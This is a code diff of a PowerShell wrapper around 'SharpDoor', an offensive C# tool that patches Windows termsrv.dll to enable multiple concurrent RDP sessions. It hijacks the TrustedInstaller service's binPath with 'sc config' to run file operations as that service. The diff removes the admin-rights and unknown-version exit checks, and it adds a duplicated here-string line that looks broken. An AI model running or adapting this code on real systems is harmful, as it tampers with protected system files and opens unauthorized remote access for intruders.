@@ -3,6 +3,9 @@ function Invoke-Sharpdoor
 
 
 $door = @"
+
+
+$door = @"
 using System;
 using System.IO;
 using System.Text;
@@ -33,7 +36,7 @@ namespace SharpDoor
             0x90
         };
 
-        static void Main(string[] args)
+        public static void Main()
         {
 
             Console.WriteLine(@"   _____ _                      _____                   ");
@@ -50,7 +53,6 @@ namespace SharpDoor
             if (!isAdminRight())
             {
                 Console.WriteLine("[!] The current session does not have administrative rights.");
-                System.Environment.Exit(0);
             }
 
             try
@@ -65,7 +67,7 @@ namespace SharpDoor
 
                 Console.WriteLine(@"[*] Backup termsrv.dll to C:\Users\Public\termsrv.dll");
 
-                executeCommand("sc config TrustedInstaller binPath= \"cmd /c move C:\\Windows\\System32\\termsrv.dll C:\\Users\\Public\\termsrv.dll\"");
+                executeCommand("sc config TrustedInstaller binPath= \"cmd /c copy C:\\Windows\\System32\\termsrv.dll C:\\Users\\Public\\termsrv.dll\"");
                 executeCommand("sc start \"TrustedInstaller\"");
                 Thread.Sleep(2000);
 
@@ -252,7 +254,7 @@ namespace SharpDoor
             else
             {
                 Console.WriteLine("[!] Unknown Version");
-                System.Environment.Exit(0);
+                
             }
         }
 
@@ -299,4 +301,5 @@ namespace SharpDoor
 Add-Type -TypeDefinition $door -Language CSharp
 
 [SharpDoor.Program]::Main()
+
 }
